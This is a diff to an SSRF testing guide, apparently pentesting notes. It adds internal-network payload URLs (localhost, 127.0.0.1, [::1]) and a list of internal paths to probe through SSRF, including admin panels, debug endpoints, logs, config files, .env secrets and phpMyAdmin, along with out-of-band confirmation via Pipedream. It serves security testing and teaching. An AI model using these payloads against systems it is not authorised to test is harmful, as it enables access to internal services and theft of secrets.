@@ -16,6 +16,9 @@ Exploitation confirmed via out-of-band (OAST) interactions
 
 Attackers typically test parameters like: dest, callback, id, file, page, url, uri, path, root, site, referrer, continue, window, reference,redirect, data, html    
 
+API Callbacks
+Image/pdf Upload via URL
+
 
 
                                                                                              Practical SSRF Testing
@@ -34,7 +37,17 @@ Example: GET /fetch?url=https://<unique>.pipedream.net
 📌 If a hit appears on Pipedream → SSRF confirmed
 
 🔹 Step 3: Internal Network Testing
-Common payloads:
+
+
+Observer Response any cretikal keywords are existed 
+http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://[::1]
+
+
+Observer response see any version grabbed or connection time out errors showing 
+
 http://localhost:80
 http://localhost:22
 https://localhost:443
@@ -44,7 +57,42 @@ https://127.0.0.1:443
 http://0.0.0.0:80
 http://0.0.0.0:22
 https://0.0.0.0:443
-http://[::]:80/                      
+http://[::]:80/   
+
+                                         
+                                                                                    Advance level Interacation
+Admin / Panel Paths
+http://127.0.0.1/admin
+http://127.0.0.1/admin/login
+http://127.0.0.1/panel
+http://127.0.0.1/control-panel
+http://127.0.0.1/dashboard
+
+Login / Auth
+http://127.0.0.1/login
+http://127.0.0.1/signin
+http://127.0.0.1/auth
+http://127.0.0.1/user/login
+
+Debug / Dev (HIGH VALUE)
+http://127.0.0.1/debug
+http://127.0.0.1/test
+http://127.0.0.1/dev
+http://127.0.0.1/staging
+
+Logs / Config / Secrets
+http://127.0.0.1/log
+http://127.0.0.1/logs
+http://127.0.0.1/error
+http://127.0.0.1/config
+http://127.0.0.1/.env
+
+Database Panels
+http://127.0.0.1/phpmyadmin
+http://127.0.0.1/mysql
+http://127.0.0.1/d
+
+
 
 
 
